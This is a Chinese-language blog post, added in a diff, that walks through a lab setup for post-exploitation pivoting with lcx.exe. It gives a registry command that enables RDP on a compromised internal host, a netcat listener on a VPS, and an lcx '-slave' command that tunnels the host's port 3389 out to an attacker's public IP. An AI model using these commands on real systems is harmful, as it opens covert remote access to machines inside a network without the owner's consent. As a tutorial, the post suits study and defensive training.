@@ -1,0 +1,84 @@
+---
+categories:
+- tools
+tags: 
+- tools
+---
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>lcx内网端口转发</title>
+    <style type="text/css" media="all">
+      body {
+        margin: 0;
+        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
+        font-size: 14px;
+        line-height: 20px;
+        color: #777;
+        background-color: white;
+      }
+      .container {
+        width: 700px;
+        margin-right: auto;
+        margin-left: auto;
+      }
+
+      .post {
+        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
+        position: relative;
+        padding: 70px;
+        bottom: 0;
+        overflow-y: auto;
+        font-size: 16px;
+        font-weight: normal;
+        line-height: 25px;
+        color: #515151;
+      }
+
+      .post h1{
+        font-size: 50px;
+        font-weight: 500;
+        line-height: 60px;
+        margin-bottom: 40px;
+        color: inherit;
+      }
+
+      .post p {
+        margin: 0 0 35px 0;
+      }
+
+      .post img {
+        border: 1px solid #D9D9D9;
+      }
+
+      .post a {
+        color: #28A1C5;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="post">
+        <h1 class="title">lcx内网端口转发</h1>
+        <div class="show-content">
+          <p>参考：<a href="http://wooyun.jozxing.cc/static/drops/tools-15000.html" target="_blank">内网转发</a></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-d029c7f3104a0a70.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-d029c7f3104a0a70.PNG?imageMogr2/auto-orient/strip" data-image-slug="d029c7f3104a0a70" data-width="616" data-height="522"><br><div class="image-caption"></div>
+</div><p>lcx的使用：当拿到一个处于内网主机的管理员权限，打开它的3389端口，映射到外网某公网IP的地址上。</p><p>这样，我们操作外网机子，就相当于操作内网主机，很方便。</p><hr><p>试验下：windowsxp 假设它是内网主机（使用host-only模式），它没有公网IP，它的内网IP是 192.168.57.129（网关192.168.60.100）</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-9deeb98499fd4fd6.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-9deeb98499fd4fd6.PNG?imageMogr2/auto-orient/strip" data-image-slug="9deeb98499fd4fd6" data-width="561" data-height="230"><br><div class="image-caption"></div>
+</div><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-4c442de2034eeb77.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-4c442de2034eeb77.PNG?imageMogr2/auto-orient/strip" data-image-slug="4c442de2034eeb77" data-width="571" data-height="280"><br><div class="image-caption">网络拓扑图<br>
+</div>
+</div><p>内网主机开启3389端口：</p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p><hr><p>查看VPS（是购买的国外的服务器）可以用来监听的端口，选择一个<b>没有使用的</b>端口，比如9977。</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-42c125389fdf5a6f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-42c125389fdf5a6f.PNG?imageMogr2/auto-orient/strip" data-image-slug="42c125389fdf5a6f" data-width="998" data-height="634"><br><div class="image-caption"></div>
+</div><p>外网主机，安装netcat</p><p>apt-get -y install nc</p><p>nc -l -p 9977 （在9977端口监听）</p><hr><p>在内网主机上，命令“lcx.exe -slave 104.xx.xx.xx 9977 192.168.60.130 3389 ”</p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-eb54986181dceea0.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-eb54986181dceea0.PNG?imageMogr2/auto-orient/strip" data-image-slug="eb54986181dceea0" data-width="680" data-height="182"><br><div class="image-caption"></div>
+</div><p>乱码是因为winxp是英文版系统，所以中文就乱码了。make a connection…… 说明连接成功了。</p><hr><p><br></p><div class="image-package">
+<img src="http://upload-images.jianshu.io/upload_images/2883590-a3c6c4afa0a7daf0.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" data-original-src="http://upload-images.jianshu.io/upload_images/2883590-a3c6c4afa0a7daf0.PNG?imageMogr2/auto-orient/strip" data-image-slug="a3c6c4afa0a7daf0" data-width="668" data-height="246"><br><div class="image-caption">、</div>
+</div><h1>总结：</h1><p>lcx.exe -lister 外网端口 内网端口           （在本地主机执行，用nc监听端口也可以）</p><p>lcx.exe -slave 104.xx.xx.xx 9977 192.168.60.130 3389   （在目标主机上执行，转发端口）</p>
+lcx.exe端口转发原理: https://tieba.baidu.com/p/3106571193?red_tag=0064785128
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
